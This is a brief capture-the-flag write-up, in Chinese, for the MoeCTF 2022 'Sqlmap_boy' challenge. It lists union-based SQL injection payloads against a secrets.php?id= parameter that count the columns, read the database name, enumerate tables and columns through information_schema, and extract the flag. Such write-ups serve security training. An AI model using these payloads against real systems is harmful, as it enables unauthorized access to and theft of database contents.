## Nssctf [MoeCTF 2022]Sqlmap_boy

![image-20240901165733983](https://gitee.com/bx33661/image/raw/master/path/image-20240901165733983.png)

我们采用`admin/admin`进入，发现`?id=`的注入口

```
secrets.php?id=1'order by 1,2,3--+

secrets.php?id=-1'union select 1,2,database()--+

secrets.php?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='moectf'--+

secrets.php?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='flag'--+

secrets.php?id=-1' union select 1,2,group_concat(flAg)from moectf.flag--+
```

最后得到flag

![image-20240901170731614](https://gitee.com/bx33661/image/raw/master/path/image-20240901170731614.png)

